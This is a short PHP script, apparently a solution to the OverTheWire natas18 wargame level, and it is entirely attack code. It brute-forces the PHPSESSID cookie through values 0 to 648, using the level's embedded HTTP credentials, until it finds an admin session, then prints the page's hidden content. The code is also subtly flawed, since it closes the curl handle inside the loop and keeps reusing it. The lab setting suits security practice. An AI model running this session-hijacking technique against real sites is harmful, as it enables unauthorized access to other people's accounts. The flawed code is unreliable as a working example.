<?php
include_once "./functions.php";
$url = "http://natas18.natas.labs.overthewire.org/index.php?debug=true";
$ch = curl_init ($url);
$headers   = array();
$found = false;
for ($i=0; $i < 649; $i++) { 
    curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=' . $i);
    curl_setopt($ch, CURLOPT_USERPWD,"natas18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, "username=admin&password=admin");
    $output = curl_exec ($ch);
    curl_close($ch);
    echo "trying with {$i}...";
    echo "\n";
    if(strpos($output,"You are an admin.") !== false)
    {
        $found = true;
        echo get_string_between($output,"<pre>","</pre>");
    }
    if($found)
    {
        break;
    }
}

?>